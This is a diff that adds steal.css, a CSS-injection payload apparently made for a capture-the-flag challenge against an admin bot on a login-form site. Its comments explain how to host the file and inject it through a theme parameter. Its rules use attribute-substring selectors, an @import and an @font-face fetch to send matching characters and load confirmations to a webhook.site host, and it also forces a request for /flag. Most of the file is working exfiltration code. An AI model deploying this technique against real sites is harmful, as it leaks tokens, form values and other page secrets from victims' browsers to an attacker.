@@ -1,0 +1,73 @@
+/* ======= steal.css =======
+ Replace WEBHOOK with your webhook.site id, e.g.
+ https://webhook.site/abcd1234-xxxx-xxxx-xxxx-xxxxxxxx
+ Then host this file (raw GitHub URL) and set ?theme=<raw_url> in target.
+ ===========================*/
+
+/* 1) force an import request to your webhook (quick evidence that admin loaded our CSS) */
+@import url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?stage=import");
+
+/* 2) try to make the admin's browser request /flag on the target site (if /flag exists).
+   This will make the admin browser issue a GET to https://fancy-login-form.ctf.zone/flag
+   — server logs will show that admin visited /flag (useful for investigation).
+   Note: background expects an image; even if /flag returns text, browser will still request it.
+*/
+body {
+  background-image: url("/flag");
+  /* keep it invisible */
+  background-size: 0px 0px;
+  background-repeat: no-repeat;
+}
+
+/* 3) cause requests to your webhook when certain DOM selectors match.
+   These rules attempt to detect characters present in id/class/value attributes.
+   For each selector that matches, the browser will fetch the background-image URL:
+   -> webhook will receive /?c=<char>&sel=<selectorID>
+   You can expand the charset as needed (here covers lowercase, digits, underscore, curly braces).
+*/
+[data-testid*="a"], [id*="a"], [class*="a"], [value*="a"] {
+  background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=a&sel=1");
+  background-size: 0px 0px;
+}
+[data-testid*="b"], [id*="b"], [class*="b"], [value*="b"] {
+  background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=b&sel=2");
+  background-size: 0px 0px;
+}
+[data-testid*="c"], [id*="c"], [class*="c"], [value*="c"] {
+  background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=c&sel=3");
+  background-size: 0px 0px;
+}
+
+/* ... repeat for letters d..z and digits 0..9 ... */
+/* To keep file compact here, below is an automated-ish block you can expand when editing. */
+
+/* digits */
+[id*="0"], [class*="0"], [value*="0"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=0&sel=d0"); background-size:0 0; }
+[id*="1"], [class*="1"], [value*="1"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=1&sel=d1"); background-size:0 0; }
+[id*="2"], [class*="2"], [value*="2"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=2&sel=d2"); background-size:0 0; }
+[id*="3"], [class*="3"], [value*="3"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=3&sel=d3"); background-size:0 0; }
+[id*="4"], [class*="4"], [value*="4"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=4&sel=d4"); background-size:0 0; }
+[id*="5"], [class*="5"], [value*="5"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=5&sel=d5"); background-size:0 0; }
+[id*="6"], [class*="6"], [value*="6"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=6&sel=d6"); background-size:0 0; }
+[id*="7"], [class*="7"], [value*="7"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=7&sel=d7"); background-size:0 0; }
+[id*="8"], [class*="8"], [value*="8"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=8&sel=d8"); background-size:0 0; }
+[id*="9"], [class*="9"], [value*="9"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=9&sel=d9"); background-size:0 0; }
+
+/* common CTF flag chars */
+[id*="{"] , [class*="{"] , [value*="{"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=%7B&sel=obr"); background-size:0 0; }
+[id*="}"] , [class*="}"] , [value*="}"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=%7D&sel=cbr"); background-size:0 0; }
+[id*="_"] , [class*="_"] , [value*="_"] { background-image: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?c=_&sel=us"); background-size:0 0; }
+
+/* 4) try @font-face fetch to webhook (additional evidence) */
+@font-face {
+  font-family: "probeFont";
+  src: url("https://webhook.site/118e8b77-286d-4746-98e5-cde06428bcca/?stage=font");
+}
+
+/* 5) small invisible element injection to trigger loads for certain selectors if present */
+:root [id], :root [class] {
+  /* attempt a tiny forced repaint that triggers image loads */
+  outline: 0;
+}
+
+/* ===== End of steal.css ===== */
